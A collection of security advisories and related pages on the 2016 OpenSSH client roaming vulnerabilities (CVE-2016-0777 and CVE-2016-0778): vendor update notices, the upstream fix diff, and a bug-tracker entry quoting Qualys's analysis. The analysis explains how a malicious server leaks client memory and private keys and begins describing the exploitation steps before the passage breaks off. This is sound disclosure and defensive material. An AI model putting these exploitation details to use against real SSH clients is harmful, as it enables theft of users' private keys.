=== Content from www.ubuntu.com_2960f546_20250125_234735.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-2869-1: OpenSSH vulnerabilities

14 January 2016

OpenSSH could be made to expose sensitive information over the network.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 15.10](/security/notices?release=wily)
* [Ubuntu 15.04](/security/notices?release=vivid)
* [Ubuntu 14.04 ESM](/security/notices?release=trusty)
* [Ubuntu 12.04](/security/notices?release=precise)

## Packages

* [openssh](/security/cves?package=openssh) - secure shell (SSH) for secure access to remote machines

## Details

It was discovered that the OpenSSH client experimental support for resuming

connections contained multiple security issues. A malicious server could

use this issue to leak client memory to the server, including private

client user keys.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 15.10

* [openssh-client](https://launchpad.net/ubuntu/%2Bsource/openssh)
  -
  [1:6.9p1-2ubuntu0.1](https://launchpad.net/ubuntu/%2Bsource/openssh/1%3A6.9p1-2ubuntu0.1)

##### Ubuntu 15.04

* [openssh-client](https://launchpad.net/ubuntu/%2Bsource/openssh)
  -
  [1:6.7p1-5ubuntu1.4](https://launchpad.net/ubuntu/%2Bsource/openssh/1%3A6.7p1-5ubuntu1.4)

##### Ubuntu 14.04

* [openssh-client](https://launchpad.net/ubuntu/%2Bsource/openssh)
  -
  [1:6.6p1-2ubuntu2.4](https://launchpad.net/ubuntu/%2Bsource/openssh/1%3A6.6p1-2ubuntu2.4)

##### Ubuntu 12.04

* [openssh-client](https://launchpad.net/ubuntu/%2Bsource/openssh)
  -
  [1:5.9p1-5ubuntu1.8](https://launchpad.net/ubuntu/%2Bsource/openssh/1%3A5.9p1-5ubuntu1.8)

In general, a standard system update will make all the necessary changes.

## References

* [CVE-2016-0777](/security/CVE-2016-0777)
* [CVE-2016-0778](/security/CVE-2016-0778)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from lists.opensuse.org_13bfbb5e_20250125_234718.html ===


[![openSUSE](https://static.opensuse.org/favicon.svg)
Mailing Lists](/archives/ "openSUSE Mailing Lists")

[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/3IMSBWS37ASILQH3ILQTPOYRQNIOYSOK/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/3IMSBWS37ASILQH3ILQTPOYRQNIOYSOK/)

[Manage this list](/manage/lists/security-announce.lists.opensuse.org/)
[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/3IMSBWS37ASILQH3ILQTPOYRQNIOYSOK/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/3IMSBWS37ASILQH3ILQTPOYRQNIOYSOK/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

[thread](/archives/list/security-announce%40lists.opensuse.org/thread/3IMSBWS37ASILQH3ILQTPOYRQNIOYSOK/#3IMSBWS37ASILQH3ILQTPOYRQNIOYSOK)

# [security-announce] SUSE-SU-2016:0117-1: critical: Security update for openssh-openssl1

![](https://seccdn.libravatar.org/avatar/099a17325bdf082b643d1a6bbacde279.jpg?s=120&d=mm&r=g)
## [opensuse-security＠opensuse.org](/archives/users/1b72def497ef4503896cd7a5fe9fb8e0/ "See the profile for opensuse-security＠opensuse.org")

14 Jan
2016

14 Jan
'16

19:11

SUSE Security Update: Security update for openssh-openssl1
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Announcement ID: SUSE-SU-2016:0117-1
Rating: critical
References: #961642 #961645
Cross-References: CVE-2016-0777 CVE-2016-0778
Affected Products:
SUSE Linux Enterprise Server 11-SECURITY
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
An update that fixes two vulnerabilities is now available.
Description:
This update for openssh-openssl1 fixes the following issues:
- CVE-2016-0777: A malicious or compromised server could cause the OpenSSH
client to expose part or all of the client's private key through the
roaming feature (bsc#961642)
- CVE-2016-0778: A malicious or compromised server could could trigger a
buffer overflow in the OpenSSH client through the roaming feature
(bsc#961645)
This update disables the undocumented feature supported by the OpenSSH
client and a commercial SSH server.
Patch Instructions:
To install this SUSE Security Update use YaST online\_update.
Alternatively you can run the command listed for your product:
- SUSE Linux Enterprise Server 11-SECURITY:
zypper in -t patch secsp3-openssh-openssl1-12327=1
To bring your system up-to-date, use "zypper patch".
Package List:
- SUSE Linux Enterprise Server 11-SECURITY (i586 ia64 ppc64 s390x x86\_64):
openssh-openssl1-6.6p1-10.1
openssh-openssl1-helpers-6.6p1-10.1
References:
<https://www.suse.com/security/cve/CVE-2016-0777.html>
<https://www.suse.com/security/cve/CVE-2016-0778.html>
<https://bugzilla.suse.com/961642>
<https://bugzilla.suse.com/961645>
--
To unsubscribe, e-mail: opensuse-security-announce+unsubscribe@opensuse.org
For additional commands, e-mail: opensuse-security-announce+help@opensuse.org

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Sign in to reply online](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/3IMSBWS37ASILQH3ILQTPOYRQNIOYSOK/)
Use email software

[Back to the thread](/archives/list/security-announce%40lists.opensuse.org/thread/3IMSBWS37ASILQH3ILQTPOYRQNIOYSOK/#3IMSBWS37ASILQH3ILQTPOYRQNIOYSOK)

[Back to the list](/archives/list/security-announce%40lists.opensuse.org/)

![HyperKitty](/static/hyperkitty/img/logo.png)
Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.12.



=== Content from packetstormsecurity.com_813b7064_20250125_234723.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from lists.opensuse.org_67c94d82_20250125_234720.html ===


[![openSUSE](https://static.opensuse.org/favicon.svg)
Mailing Lists](/archives/ "openSUSE Mailing Lists")

[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/R7FZXC627WBJIDCDZEYQLLMKYOCLGTH2/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/R7FZXC627WBJIDCDZEYQLLMKYOCLGTH2/)

[Manage this list](/manage/lists/security-announce.lists.opensuse.org/)
[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/R7FZXC627WBJIDCDZEYQLLMKYOCLGTH2/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/R7FZXC627WBJIDCDZEYQLLMKYOCLGTH2/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

[thread](/archives/list/security-announce%40lists.opensuse.org/thread/R7FZXC627WBJIDCDZEYQLLMKYOCLGTH2/#R7FZXC627WBJIDCDZEYQLLMKYOCLGTH2)

# [security-announce] openSUSE-SU-2016:0127-1: critical: Security update for openssh

![](https://seccdn.libravatar.org/avatar/099a17325bdf082b643d1a6bbacde279.jpg?s=120&d=mm&r=g)
## [opensuse-security＠opensuse.org](/archives/users/1b72def497ef4503896cd7a5fe9fb8e0/ "See the profile for opensuse-security＠opensuse.org")

15 Jan
2016

15 Jan
'16

02:11

openSUSE Security Update: Security update for openssh
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Announcement ID: openSUSE-SU-2016:0127-1
Rating: critical
References: #961642 #961645
Cross-References: CVE-2016-0777 CVE-2016-0778
Affected Products:
openSUSE 13.2
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
An update that fixes two vulnerabilities is now available.
Description:
This update for openssh fixes the following issues:
- CVE-2016-0777: A malicious or compromised server could cause the OpenSSH
client to expose part or all of the client's private key through the
roaming feature (bsc#961642)
- CVE-2016-0778: A malicious or compromised server could could trigger a
buffer overflow in the OpenSSH client through the roaming feature
(bsc#961645)
This update disables the undocumented feature supported by the OpenSSH
client and a commercial SSH server.
Patch Instructions:
To install this openSUSE Security Update use YaST online\_update.
Alternatively you can run the command listed for your product:
- openSUSE 13.2:
zypper in -t patch openSUSE-2016-39=1
To bring your system up-to-date, use "zypper patch".
Package List:
- openSUSE 13.2 (i586 x86\_64):
openssh-6.6p1-5.3.1
openssh-askpass-gnome-6.6p1-5.3.1
openssh-askpass-gnome-debuginfo-6.6p1-5.3.1
openssh-debuginfo-6.6p1-5.3.1
openssh-debugsource-6.6p1-5.3.1
openssh-fips-6.6p1-5.3.1
openssh-helpers-6.6p1-5.3.1
openssh-helpers-debuginfo-6.6p1-5.3.1
References:
<https://www.suse.com/security/cve/CVE-2016-0777.html>
<https://www.suse.com/security/cve/CVE-2016-0778.html>
<https://bugzilla.suse.com/961642>
<https://bugzilla.suse.com/961645>
--
To unsubscribe, e-mail: opensuse-security-announce+unsubscribe@opensuse.org
For additional commands, e-mail: opensuse-security-announce+help@opensuse.org

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Sign in to reply online](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/R7FZXC627WBJIDCDZEYQLLMKYOCLGTH2/)
Use email software

[Back to the thread](/archives/list/security-announce%40lists.opensuse.org/thread/R7FZXC627WBJIDCDZEYQLLMKYOCLGTH2/#R7FZXC627WBJIDCDZEYQLLMKYOCLGTH2)

[Back to the list](/archives/list/security-announce%40lists.opensuse.org/)

![HyperKitty](/static/hyperkitty/img/logo.png)
Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.12.



=== Content from www.openssh.com_b34ebf8b_20250125_234726.html ===
OpenSSH 7.1p2 was released on 2016-01-14. It is available from the
mirrors listed at https://www.openssh.com/.
OpenSSH is a 100% complete SSH protocol 2.0 implementation and
includes sftp client and server support. OpenSSH also includes
transitional support for the legacy SSH 1.3 and 1.5 protocols
that may be enabled at compile-time.
Once again, we would like to thank the OpenSSH community for their
continued support of the project, especially those who contributed
code or patches, reported bugs, tested snapshots or donated to the
project. More information on donations may be found at:
http://www.openssh.com/donations.html
Changes since OpenSSH 7.1p1
===========================
\* SECURITY: ssh(1): The OpenSSH client code between 5.4 and 7.1
contains experimental support for resuming SSH-connections (roaming).
The matching server code has never been shipped, but the client
code was enabled by default and could be tricked by a malicious
server into leaking client memory to the server, including private
client user keys.
The authentication of the server host key prevents exploitation
by a man-in-the-middle, so this information leak is restricted
to connections to malicious or compromised servers.
MITIGATION: For OpenSSH >= 5.4 the vulnerable code in the client
can be completely disabled by adding 'UseRoaming no' to the gobal
ssh\_config(5) file, or to user configuration in ~/.ssh/config,
or by passing -oUseRoaming=no on the command line.
PATCH: See below for a patch to disable this feature (Disabling
Roaming in the Source Code).
This problem was reported by the Qualys Security Advisory team.
\* SECURITY: Fix an out of-bound read access in the packet handling
code. Reported by Ben Hawkes.
\* PROTOCOL: Correctly interpret the 'first\_kex\_follows' option during
the intial key exchange. Reported by Matt Johnston.
\* Further use of explicit\_bzero has been added in various buffer
handling code paths to guard against compilers aggressively
doing dead-store removal.
Checksums:
==========
- SHA1 (openssh-7.1p2.tar.gz) = 9202f5a2a50c8a55ecfb830609df1e1fde97f758
- SHA256 (openssh-7.1p2.tar.gz) = dd75f024dcf21e06a0d6421d582690bf987a1f6323e32ad6619392f3bfde6bbd
Please note that the SHA256 signatures are base64 encoded and not
hexadecimal (which is the default for most checksum tools). The PGP
key used to sign the releases is available as RELEASE\_KEY.asc from
the mirror sites.
Reporting Bugs:
===============
- Please read http://www.openssh.com/report.html
Security bugs should be reported directly to openssh@openssh.com
OpenSSH is brought to you by Markus Friedl, Niels Provos, Theo de Raadt,
Kevin Steves, Damien Miller, Darren Tucker, Jason McIntyre, Tim Rice and
Ben Lindstrom.
Disabling Roaming in the Source Code:
=====================================
--- readconf.c 30 Jul 2015 00:01:34 -0000 1.239
+++ readconf.c 13 Jan 2016 23:17:23 -0000
@@ -1648,7 +1648,7 @@ initialize\_options(Options \* options)
options->tun\_remote = -1;
options->local\_command = NULL;
options->permit\_local\_command = -1;
- options->use\_roaming = -1;
+ options->use\_roaming = 0;
options->visual\_host\_key = -1;
options->ip\_qos\_interactive = -1;
options->ip\_qos\_bulk = -1;
@@ -1819,8 +1819,7 @@ fill\_default\_options(Options \* options)
options->tun\_remote = SSH\_TUNID\_ANY;
if (options->permit\_local\_command == -1)
options->permit\_local\_command = 0;
- if (options->use\_roaming == -1)
- options->use\_roaming = 1;
+ options->use\_roaming = 0;
if (options->visual\_host\_key == -1)
options->visual\_host\_key = 0;
if (options->ip\_qos\_interactive == -1)
--- ssh.c 30 Jul 2015 00:01:34 -0000 1.420
+++ ssh.c 13 Jan 2016 23:17:23 -0000
@@ -1882,9 +1882,6 @@ ssh\_session2(void)
fork\_postauth();
}
- if (options.use\_roaming)
- request\_roaming();
-
return client\_loop(tty\_flag, tty\_flag ?
options.escape\_char : SSH\_ESCAPECHAR\_NONE, id);
}


=== Content from bto.bluecoat.com_3e30d39c_20250125_234741.html ===




=== Content from bugzilla.suse.com_de98ff27_20250126_125243.html ===


| Bugzilla – Bug 961642 | VUL-0: CVE-2016-0777: openssh: Information leak in ssh client | Last modified: 2019-06-16 14:37:59 UTC |
| --- | --- | --- |

|  |
| --- |

* [Home](./)
* | [New](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [IDP Log In](/saml2_login.cgi?idp=IDP&target=show_bug.cgi%3Fid%3D961642)
* |
  [Forgot Password](https://idp-portal.suse.com/univention/self-service/#page=passwordreset)

[**Bug 961642**](show_bug.cgi?id=961642)
(CVE-2016-0777)
- VUL-0: CVE-2016-0777: openssh: Information leak in ssh client

[Summary:](page.cgi?id=glossary.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
VUL-0: CVE-2016-0777: openssh: Information leak in ssh client

| | [Status](page.cgi?id=status_resolution_matrix.html): | RESOLVED FIXED | | --- | --- | |  | | | [Alias:](page.cgi?id=glossary.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2016-0777 | |  | | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | SUSE Security Incidents | | [Classification:](page.cgi?id=glossary.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Novell Products | | [Component:](describecomponents.cgi?product=SUSE Security Incidents "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | Incidents ([show other bugs](buglist.cgi?component=Incidents&product=SUSE%20Security%20Incidents&bug_status=__open__)) | | [Version:](page.cgi?id=glossary.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=glossary.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Other Other | |  | | | [Priority](page.cgi?id=glossary.html#priority): | P1 - Urgent **Severity**: Major | | [Target Milestone:](page.cgi?id=glossary.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=glossary.html#assigned_to "The person in charge of resolving the bug.") | Security Team bot | | [QA Contact:](page.cgi?id=glossary.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") | Security Team bot | |  | | | [URL:](page.cgi?id=glossary.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=glossary.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") | CVSSv2:SUSE:CVE-2016-0777:4.3:(AV:N/A... | | [Keywords:](describekeywords.cgi "You can add keywords from a defined list to bugs, in order to easily identify and group them.") |  | |  | | | [Depends on:](page.cgi?id=glossary.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=glossary.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | |  | | Reported: | 2016-01-13 08:24 UTC by Johannes Segitz | | --- | --- | | Modified: | 2019-06-16 14:37 UTC ([History](show_activity.cgi?id=961642)) | | CC List: | 12 users (show)  ab alexander.runge andreas.thomas astieger forgotten\_-82siXJqhV jhura jsegitz krahmer meissner pcerny saweber thomas | |  | | | [See Also:](page.cgi?id=glossary.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") |  | | [Found By:](page.cgi?id=glossary.html#cf_foundby "A custom Drop Down field in this installation of Bugzilla.") | --- | | [Services Priority:](page.cgi?id=glossary.html#cf_nts_priority "A custom Free Text field in this installation of Bugzilla.") |  | | [Business Priority:](page.cgi?id=glossary.html#cf_biz_priority "A custom Free Text field in this installation of Bugzilla.") |  | | [Blocker:](page.cgi?id=glossary.html#cf_blocker "A custom Drop Down field in this installation of Bugzilla.") | --- | | [Marketing QA Status:](page.cgi?id=glossary.html#cf_marketing_qa_status "A custom Drop Down field in this installation of Bugzilla.") | --- | | [IT Deployment:](page.cgi?id=glossary.html#cf_it_deployment "A custom Drop Down field in this installation of Bugzilla.") | --- | |  | |  * [Clone This Bug](enter_bug.cgi?cloned_bug_id=961642) |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | | | --- | --- | | [**Final upstream patch**](attachment.cgi?id=661720 "View the content of the attachment") (2.22 KB, patch)  [2016-01-14 08:15 UTC](#attach_661720 "Go to the comment associated with the attachment"), Johannes Segitz | [Details](attachment.cgi?id=661720&action=edit) | [Diff](attachment.cgi?id=661720&action=diff) | | [View All](attachment.cgi?bugid=961642&action=viewall)  [Add an attachment](attachment.cgi?bugid=961642&action=enter) (proposed patch, testcase, etc.) | |   | Note You need to [log in](show_bug.cgi?id=961642&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. | | --- | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=961642#c0)  Johannes Segitz   2016-01-13 08:24:59 UTC  ``` Qualys reports:  Since version 5.4 (released on March 8, 2010), the OpenSSH client supports an undocumented feature called roaming: if the connection to an SSH server breaks unexpectedly, and if the server supports roaming as well, the client is able to reconnect to the server and resume the suspended SSH session.  Although roaming is not supported by the OpenSSH server, it is enabled by default in the OpenSSH client, and contains two vulnerabilities that can be exploited by a malicious SSH server (or a trusted but compromised server): an information leak (memory disclosure), and a buffer overflow (heap-based).  The information leak is exploitable in the default configuration of the OpenSSH client, and (depending on the client's version, compiler, and operating system) allows a malicious SSH server to steal the client's private keys. This information leak may have already been exploited in the wild by sophisticated attackers, and high-profile sites or users may need to regenerate their SSH keys accordingly.  Detailed information in the next comment ``` [Comment 1](show_bug.cgi?id=961642#c1)  Johannes Segitz   2016-01-13 08:30:21 UTC  ``` ======================================================================== Information Leak (CVE-2016-IILU) ========================================================================  ------------------------------------------------------------------------ Analysis ------------------------------------------------------------------------  If the OpenSSH client connects to an SSH server that offers the key exchange algorithm "resume@appgate.com", it sends the global request "roaming@appgate.com" to the server, after successful authentication. If this request is accepted, the client allocates a roaming buffer out_buf, by calling malloc() (and not calloc()) with an out_buf_size that is arbitrarily chosen by the server:   63 void  64 roaming_reply(int type, u_int32_t seq, void *ctxt)  65 {  66         if (type == SSH2_MSG_REQUEST_FAILURE) {  67                 logit("Server denied roaming");  68                 return;  69         }  70         verbose("Roaming enabled");  ..  75         set_out_buffer_size(packet_get_int() + get_snd_buf_size());  ..  77 }   40 static size_t out_buf_size = 0;  41 static char *out_buf = NULL;  42 static size_t out_start;  43 static size_t out_last;  ..  75 void  76 set_out_buffer_size(size_t size)  77 {  78         if (size == 0 || size > MAX_ROAMBUF)  79                 fatal("%s: bad buffer size %lu", __func__, (u_long)size);  80         /*  81          * The buffer size can only be set once and the buffer will live  82          * as long as the session lives.  83          */  84         if (out_buf == NULL) {  85                 out_buf_size = size;  86                 out_buf = xmalloc(size);  87                 out_start = 0;  88                 out_last = 0;  89         }  90 }  The OpenSSH client's roaming_write() function, a simple wrapper around write(), calls wait_for_roaming_reconnect() to transparently reconnect to the SSH server after a disconnection. It also calls buf_append() to copy the data sent to the server into the roaming buffer out_buf. During a reconnection, the client is therefore able to resend the data that was not received by the server because of the disconnection:  198 void 199 resend_bytes(int fd, u_int64_t *offset) 200 { 201         size_t available, needed; 202 203         if (out_start < out_last) 204                 available = out_last - out_start; 205         else 206                 available = out_buf_size; 207         needed = write_bytes - *offset; 208         debug3("resend_bytes: resend %lu bytes from %llu", 209             (unsigned long)needed, (unsigned long long)*offset); 210         if (needed > available) 211                 fatal("Needed to resend more data than in the cache"); 212         if (out_last < needed) { 213                 int chunkend = needed - out_last; 214                 atomicio(vwrite, fd, out_buf + out_buf_size - chunkend, 215                     chunkend); 216                 atomicio(vwrite, fd, out_buf, out_last); 217         } else { 218                 atomicio(vwrite, fd, out_buf + (out_last - needed), needed); 219         } 220 }  In the OpenSSH client's roaming buffer out_buf, the most recent data sent to the server begins at index out_start and ends at index out_last. As soon as this circular buffer is full, buf_append() maintains the invariant "out_start = out_last + 1", and consequently three different cases have to be considered:  - "out_start < out_last" (lines 203-204): out_buf is not full yet (and   out_start is still equal to 0), and the amount of data available in   out_buf is indeed "out_last - out_start";  - "out_start > out_last" (lines 205-206): out_buf is full (and out_start   is exactly equal to "out_last + 1"), and the amount of data available   in out_buf is indeed the entire out_buf_size;  - "out_start == out_last" (lines 205-206): no data was ever written to   out_buf (and both out_start and out_last are still equal to 0) because   no data was ever sent to the server after roaming_reply() was called,   but the client sends (leaks) the entire uninitialized out_buf to the   server (line 214), as if out_buf_size bytes of data were available.  In order to successfully exploit this information leak and retrieve sensitive information from the OpenSSH client's memory (for example, private SSH keys, or memory addresses useful for further exploitation), a malicious server needs to:  - Massage the client's heap before roaming_reply() malloc()ates out_buf,   and force malloc() to return a previously free()d but uncleansed chunk   of sensitive information. The simple proof-of-concept in this advisory   does not implement heap massaging.  - 